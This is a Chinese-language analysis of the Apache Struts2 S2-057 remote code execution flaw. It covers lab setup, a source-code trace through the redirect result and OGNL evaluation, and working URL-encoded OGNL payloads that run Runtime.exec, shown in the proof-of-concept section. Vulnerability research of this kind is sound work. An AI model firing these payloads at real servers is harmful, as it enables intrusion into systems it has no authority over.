### S2-057漏洞分析

#### 1.漏洞简介

struts2在xml配置中如果namespace未设置且（Action Configuration)中未设置或用通配符namespace时可能会导致远程代码执行

影响版本 struts2.3-2.3.34;Struts2.5-2.5.16

#### 2.漏洞复现

A.下载struts-showcase-apps

​	满足漏洞版本的showcase,http://archive.apache.org/dist/struts/2.3.31/ ，选择struts-2.3.31-apps.zip

B.将struts2-showcase.war放到tomcat的目录下,war包会自动解包

C.更改struts-actionchaining.xml内容为

```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE struts PUBLIC
	"-//Apache Software Foundation//DTD Struts Configuration 2.3//EN"
	"http://struts.apache.org/dtds/struts-2.3.dtd">
	
<struts>
	<package name="actionchaining" extends="struts-default">
		<action name="actionChain1" class="org.apache.struts2.showcase.actionchaining.ActionChain1">
			<result type="redirectAction">
                <param name = "actionName">register2</param>
            </result>
		</action>
	</package>
</struts>



```

注意struts-actionChaining.xml有两处,/WEB-INF/src/java以及/WEB-INF/classes都要修改

D.关闭tomcat后重新运行tomcat,输入youip:8080/struts2-showcase/${(111+2111)}/actionChain1.action即可验证漏洞，得到302 response 返回url:youip:8080/struts2-showcase/2222/register2.action

###### POC：

2.3.20：

```
/%24%7B%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C@java.lang.Runtime@getRuntime%28%29.exec%28%27calc.exe%27%29%7D/index.action
```

2.3.34

```
/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D@java.lang.Runtime@getRuntime%28%29.exec%28%22calc%22%29%29%7D/actionChain1.action
```



#### 3.源码解析

###### 3.1 验证漏洞存在


ServletActionRedirectResult.class

```
public void execute(ActionInvocation invocation) throws Exception {
        this.actionName = this.conditionalParse(this.actionName, invocation);
        if (this.namespace == null) {
            this.namespace = invocation.getProxy().getNamespace();//<----source
        } else {
            this.namespace = this.conditionalParse(this.namespace, invocation);
        }

        if (this.method == null) {
            this.method = "";
        } else {
            this.method = this.conditionalParse(this.method, invocation);
        }
        
        String tmpLocation = this.actionMapper.getUriFromActionMapping(new ActionMapping(this.actionName, this.namespace, this.method, (Map)null));
        this.setLocation(tmpLocation);//namespace传入到location参数
        super.execute(invocation);//漏洞触发起始位置
    }
```

getUrlFromActionMapping()返回一个使用namespace构造的url字符串ActionMapping


![1.png](https://github.com/girlkb/struts2/blob/master/S2-057/1.png)

=>ServletRedirectResult.class

```
 public void execute(ActionInvocation invocation) throws Exception {
        if (this.anchor != null) {
            this.anchor = this.conditionalParse(this.anchor, invocation);
        }

        super.execute(invocation);//<---调用父类的方法
    }
```

=>StrutsResultSupport.class 

```
 public void execute(ActionInvocation invocation) throws Exception {
        //通过localtion字段调用conditionalParse()
        this.lastFinalLocation = this.conditionalParse(this.location, invocation);
        this.doExecute(this.lastFinalLocation, invocation);
    }
```

=>TextParseUtil.class

```
public static String translateVariables(String expression, ValueStack stack, TextParseUtil.ParsedValueEvaluator evaluator) {
        return translateVariables(new char[]{'$', '%'}, expression, stack, String.class, evaluator).toString();//<--expression:"struts2-showcase/${(111+2111)}/register2.action"
    }
```

translateVariables()会调用ognl表达式,最终会执行:

expression的值会被放到node里,分解为两个childern

```
public static Object add(Object v1, Object v2) {//v1 111,v2 2111
    int type = getNumericType(v1, v2, true);
    switch(type) {//type 4
    case 6:
        return bigIntValue(v1).add(bigIntValue(v2));
    case 7:
    case 8:
        return newReal(type, doubleValue(v1) + doubleValue(v2));
    case 9:
        return bigDecValue(v1).add(bigDecValue(v2));
    case 10:
        int t1 = getNumericType(v1);
        int t2 = getNumericType(v2);
        if ((t1 == 10 || v2 != null) && (t2 == 10 || v1 != null)) {
            return stringValue(v1) + stringValue(v2);
        } else {
            throw new NullPointerException("Can't add values " + v1 + " , " + v2);
        }
    default:
        return newInteger(type, longValue(v1) + longValue(v2));//<---最后执行这个方法
    }
}
```

###### 3.2执行任意命令

如下图所示，为调试过程中打得断点

![4.png](https://github.com/girlkb/struts2/blob/master/S2-057/4.png)

与验证漏洞存在相同，最后触发漏洞的原因是调用了TextParseUtil.translateVariables()方法，
![2.png](https://github.com/girlkb/struts2/blob/master/S2-057/2.png)
而最后执行命令是调用的OgnlRuntime.invokerMethod()方法。![3.png](https://github.com/girlkb/struts2/blob/master/S2-057/3.png)

#### 4.参考

https://www.anquanke.com/post/id/157518

https://www.anquanke.com/post/id/157823
